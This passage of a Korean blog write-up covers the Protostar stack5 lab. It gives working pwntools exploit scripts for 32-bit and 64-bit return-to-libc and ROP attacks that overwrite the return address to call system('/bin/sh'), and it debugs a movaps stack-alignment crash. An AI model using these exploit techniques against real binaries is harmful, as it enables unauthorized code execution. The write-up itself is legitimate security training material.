&lt;p&gt;&lt;img src=&quot;/assets/img/posts/protostar5/Untitled%208.jpeg&quot; alt=&quot;Untitled&quot; width=&quot;100%&quot; height=&quot;100%&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0xfffffff0&lt;/code&gt; 과 and 연산을 함으로써 무조건 16의 배수로 만든 esp를 ebp에 넣어서 스택의 바닥을 지정하는 부분이 보인다.&lt;/p&gt;

&lt;p&gt;다시 핵심으로 돌아와, 대상 파일을 컴파일해 앞의 과정을 다시 밟은 이후 페이로드를 지정한다면 아래처럼 쉘을 딸 수 있다.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/protostar5/Untitled%209.jpeg&quot; alt=&quot;Untitled&quot; width=&quot;100%&quot; height=&quot;100%&quot; /&gt;&lt;/p&gt;

&lt;p&gt;물론 스크립트를 작성해 익스플로잇을 수행할 수도 있다.&lt;/p&gt;

&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c1&quot;&gt;# stack5_32_exploit.py
&lt;/span&gt;&lt;span class=&quot;kn&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;pwn&lt;/span&gt; &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;process&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos;./stack5_32&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;system_add&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;p32&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0xf7e1b3d0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;ret_corrupt&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;p32&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x41414141&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;str_add&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;p32&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0xf7f5c1db&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;sa&quot;&gt;b&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos;A&apos;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x44&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;system_add&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ret_corrupt&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;str_add&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sendline&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;interactive&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;hr /&gt;
&lt;p&gt;&lt;br /&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h1 id=&quot;2-x86-64-기반에서-rtl-수행하기&quot;&gt;2. X86-64 기반에서 RTL 수행하기&lt;/h1&gt;

&lt;p&gt;앞서 익스플로잇의 세 단계 중 두 단계를 끝냈기 때문에 이 절에서는 마지막 단계에 대해서만 서술한다.&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;대상 프로그램 분석해 취약점 지정&lt;/li&gt;
  &lt;li&gt;해당 취약점을 익스플로잇할 방법 지정&lt;/li&gt;
  &lt;li&gt;익스플로잇 생성&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h2 id=&quot;21-페이로드가-왜-이-모양이야&quot;&gt;2.1. 페이로드가 왜 이 모양이야?&lt;/h2&gt;

&lt;p&gt;64비트로 컴파일된 프로그램에 RTL을 하려면 아래와 같은 페이로드를 넣어야 한다.&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;offset bytes + Gadget address(pop rdi;ret;) + parameter address + Library function address
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;대체 왜 그런 거지 싶다. 이유는 정말 간단한데, 앞서 설명했던 Cdecl 규정, 함수의 Calling Convention 때문이다. x86-64에서는 함수의 첫 파라미터 6개가 rdi, rsi, rdx, rcx, r8, r9에 순서대로 들어가고, 그러고도 파라미터가 남는다면 뒤에서부터 스택에 들어간다는 것을 꼭 기억하자.&lt;/p&gt;

&lt;p&gt;우리는 system() 함수에 “/bin/sh” 문자열의 주소를 첫 번째이자 마지막 인자로 전달하는 것이 목적이다. 즉, “/bin/sh”의 주소를 rdi에 저장해야만 한다. 그렇게 하기 위해&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;스택 프레임의 ret add에 메모리에 적재된 수많은 인스트럭션 중 어딘가에 있을 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;pop rdi;ret&lt;/code&gt; 의 주소를 넣고&lt;/li&gt;
  &lt;li&gt;해당 인스트럭션 중 첫 번째로 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;pop rdi&lt;/code&gt; 가 실행된다면 rsp가 위치한 곳, 즉 현재 ret address의 바로 아래 위치가 rdi에 담기고 rsp가 한 주소 아래로 내려가게 될 것을 이용한다.&lt;/li&gt;
  &lt;li&gt;직후 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ret&lt;/code&gt; 가 실행될 것, 즉 현재 위치한 rsp가 가리키는 스택 위치에 담긴 주소가 rip에 담겨 이다음에 실행될 것을 이용한다.&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;이러한 흐름을 성공시키기 위해 페이로드는 위와 같은 형태가 된다.&lt;/p&gt;

&lt;p&gt;이 시점에서 알아내야 하는 정보는 4개로 좁혀진다.&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;Offset byte의 크기&lt;/li&gt;
  &lt;li&gt;Gadget의 주소&lt;/li&gt;
  &lt;li&gt;“/bin/sh”의 주소&lt;/li&gt;
  &lt;li&gt;system의 주소&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h2 id=&quot;22-익스플로잇-생성&quot;&gt;2.2. 익스플로잇 생성&lt;/h2&gt;

&lt;h3 id=&quot;221-offset-byte의-크기-알기&quot;&gt;2.2.1. Offset Byte의 크기 알기&lt;/h3&gt;

&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;disas main&lt;/code&gt; 명령어를 이용한다.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/protostar5/Untitled%2010.jpeg&quot; alt=&quot;Untitled&quot; width=&quot;100%&quot; height=&quot;100%&quot; /&gt;&lt;/p&gt;

&lt;p&gt;gets에 들어가는 첫 번째 인자를 저장하는 rdi에 들어가는 값을 확인해 보면 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;rbp-0x40&lt;/code&gt; 임을 알 수 있다. 즉, rbp까지를 오염시키기 위해 0x48 bytes가 필요함을 알 수 있다.&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;offset byte = 0x48 bytes&lt;/code&gt;&lt;/p&gt;

&lt;h3 id=&quot;222-gadget의-주소-알기&quot;&gt;2.2.2. Gadget의 주소 알기&lt;/h3&gt;

&lt;p&gt;목표하는 gadget은 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;pop rdi;ret;&lt;/code&gt; 이다. 이를 찾기 위해 pwntools를 이용한다.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/protostar5/Untitled%2011.jpeg&quot; alt=&quot;Untitled&quot; width=&quot;100%&quot; height=&quot;100%&quot; /&gt;&lt;/p&gt;

&lt;p&gt;타겟 프로그램은 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/lib/x86_64-linux-gnu/libc.so.6&lt;/code&gt; 을 사용하고 있음을 확인했다.&lt;/p&gt;

&lt;p&gt;따라서 가젯을 찾아오는 스크립트는 아래와 같다.&lt;/p&gt;

&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kn&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;pwn&lt;/span&gt; &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;libc&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ELF&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos;/lib/x86_64-linux-gnu/libc.so.6&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;gadget&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ROP&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;libc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos;gadget(ret rdi;ret;) = &apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;hex&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;gadget&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;find_gadget&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;([&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos;pop rdi&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&apos;ret&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;])[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;])))&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos;system=&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;hex&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;libc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;symbols&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos;system&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]))&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos;/bin/sh=&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;hex&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;list&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;libc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;search&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;sa&quot;&gt;b&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos;/bin/sh&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]))&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;스크립트 실행 결과는 아래와 같았다.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/protostar5/Untitled%2012.jpeg&quot; alt=&quot;Untitled&quot; width=&quot;100%&quot; height=&quot;100%&quot; /&gt;&lt;/p&gt;

&lt;p&gt;앞서 알아둔 라이브러리 시작 주소가 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0x7ffff7a0364f&lt;/code&gt; 이고, 가젯의 오프셋이 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0x2164f&lt;/code&gt; 이므로 둘을 더한 결과값인 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0x7ffff7a0364f&lt;/code&gt; 에 정말로 가젯이 적재되어 있는지 gdb로 확인해 보자.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/protostar5/Untitled%2013.jpeg&quot; alt=&quot;Untitled&quot; width=&quot;100%&quot; height=&quot;100%&quot; /&gt;&lt;/p&gt;

&lt;p&gt;적재되어 있다.&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Gadget address = 0x7ffff7a0364f&lt;/code&gt;&lt;/p&gt;

&lt;h3 id=&quot;223-binsh과-system의-주소-알기&quot;&gt;2.2.3. “/bin/sh”과 system의 주소 알기&lt;/h3&gt;

&lt;p&gt;위에서 가젯의 위치를 알아내기 위한 스크립트에서 이미 알아냈기 때문에 값만 쓰고 생략한다.&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;System offset = 0x4f420&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/bin/sh offset = 0x1b3d88&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;일일이 더하고 싶지 않기 때문에 계산은 스크립트에게 맡겨야겠다.&lt;/p&gt;

&lt;h3 id=&quot;224-익스플로잇-생성&quot;&gt;2.2.4. 익스플로잇 생성&lt;/h3&gt;

&lt;blockquote&gt;
  &lt;p&gt;🤩: 좋아 이제 스크립트만 실행하면 끝이다!&lt;/p&gt;

  &lt;p&gt;🤨: 아니 그런데 왜 안돼&lt;/p&gt;

  &lt;p&gt;🤯: 아 SEGFAULT다&lt;/p&gt;

  &lt;p&gt;💩: 하….&lt;/p&gt;

&lt;/blockquote&gt;

&lt;p&gt;이럴 땐 당황하지 말고 침착하게 트러블슈팅을 시작하면 된다. 물론 나는 너무 당황해서 찔끔 울긴 했는데&lt;/p&gt;

&lt;p&gt;pwntools에서 제공하는 기능 중, gdb에 현재 프로세스를 attach하게 해주는 기능이 있다. 현재 프로세스의 pid를 가져와 그것을 gdb에게 주는 식의 매커니즘인데, 이를 사용하는 방법은 아래와 같다.&lt;/p&gt;

&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kn&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;pwn&lt;/span&gt; &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;libc&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ELF&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos;/lib/x86_64-linux-gnu/libc.so.6&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;gadget&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ROP&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;libc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;libc_base&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x7ffff79e2000&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;gadget_offset&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;gadget&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;find_gadget&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;([&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos;pop rdi&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&apos;ret&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;])[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]))&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;system_offset&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;libc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;symbols&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos;system&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;])&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;string_offset&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;list&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;libc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;search&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;sa&quot;&gt;b&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos;/bin/sh&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;])&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;gadget_address&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;libc_base&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;gadget_offset&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;system_address&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;libc_base&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;system_offset&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;string_address&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;libc_base&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;string_offset&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;process&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos;./stack5_64&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;sa&quot;&gt;b&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos;A&apos;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x48&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;p64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;gadget_address&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;p64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;string_address&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;p64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;system_address&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;gdb&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;attach&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;

&lt;span class=&quot;nb&quot;&gt;raw_input&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;1&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sendline&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;interactive&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;gdb.attach(process({program_name}))&lt;/code&gt;를 이용해 스크립트에서 돌리는 프로그램에 gdb를 붙이도록 했고, gdb를 붙인 프로그램이 미처 반응하기도 전에 실행되고 끝나버리는 상황을 방지하기 위해 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;raw_input(”1”)&lt;/code&gt; 코드를 삽입했다. 위 스크립트를 실행하면 gdb 창이 뜨는데, 그때 브레이크 포인트를 설정하고 원래 터미널 창에 1을 입력한 후 gdb 창에서 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;c&lt;/code&gt; 를 누르면 디버깅을 할 수 있다.&lt;/p&gt;

&lt;p&gt;브레이크 포인트 설정 시 콜스택을 잘 확인해야 한다. 이미 실행되었던 인스트럭션에 브레이크 포인트를 설정하는 바보짓은 절대 엄금이다! &lt;em&gt;그렇다. 내가 바로 그 바보다! 안녕하세요 반갑습니다 바보 1입니다&lt;/em&gt;&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;system&lt;/code&gt; 함수는 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;do_system&lt;/code&gt; 함수를 콜하고, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;do_system&lt;/code&gt; 함수는 거의 끄트머리에서 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;execve&lt;/code&gt; 함수를 콜하면서 인자를 넘겨주는 형식이다. 즉, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;do_system&lt;/code&gt; 함수 내부로 들어갔을 때 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;execve&lt;/code&gt; 를 콜하기도 전에 SEGFAULT가 나는 이유를 알아내는 것이 현재 디버깅의 목적이다.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/protostar5/Untitled%2014.jpeg&quot; alt=&quot;Untitled&quot; width=&quot;100%&quot; height=&quot;100%&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;c&lt;/code&gt;를 누르고 보면 위 부분에서 rip가 freezed 된 것이 보인다.&lt;/p&gt;

&lt;p&gt;대관절 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;movaps&lt;/code&gt; 가 뭐냐 싶다.  검색해본 결과, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;movaps&lt;/code&gt; 는 64 비트 프로그램의 Calling convention을 지켜주고자 도입된 인스트럭션으로, 스택 주소가 16의 배수로 딱딱 떨어지게 데이터가 담겨있는 게 아니면 앞으로의 함수 콜에 심각한 문제가 생길 것을 우려해 프로그램을 멈추게 만드는 인스트럭션이다.&lt;/p&gt;

&lt;p&gt;지금 문제가 된 인스트럭션을 보면, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;movaps xmmword ptr [rsp + 0x40], xmm0&lt;/code&gt; 이라고 되어 있는데, xmm0라는 레지스터는 SIMD 연산에 사용되는 전용 레지스터인데, SIMD(Single Instruction Multi Data)라는 이름에서도 알 수 있듯 한 레지스터에 4개의 데이터를 한꺼번에 집어넣을 수 있는 레지스터이다. 지금은 중요하지 않으니 그냥 넘어가자. 중요한 것은 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;xmmword ptr [rsp + 0x40]&lt;/code&gt; 이다. 현재 보이는 컨텍스트의 아랫부분에 표현된 스택을 확인하면, rsp의 위치는 끝이 8로 끝나기 때문에 8의 배수이지만 16의 배수는 아니다. 여기에 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0x40&lt;/code&gt; 을 더한 스택의 위치는 역시 8의 배수이지만 16의 배수는 아니다. 즉, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;movaps&lt;/code&gt; 인스트럭션의 종료 조건에 딱 들어맞는 상황이다.&lt;/p&gt;

&lt;p&gt;이런 상황은 사실 ROP 공격을 하지 않았다면 발생하지 않았을 상황이다. 그리고 ROP 공격을 할 때 가장 자주 맞닥뜨리는 pitfall 이기도 하다. 조금 더 자세한 설명은 &lt;a href=&quot;https://ropemporium.com/guide.html&quot;&gt;이쪽을 참고하자.&lt;/a&gt;&lt;/p&gt;

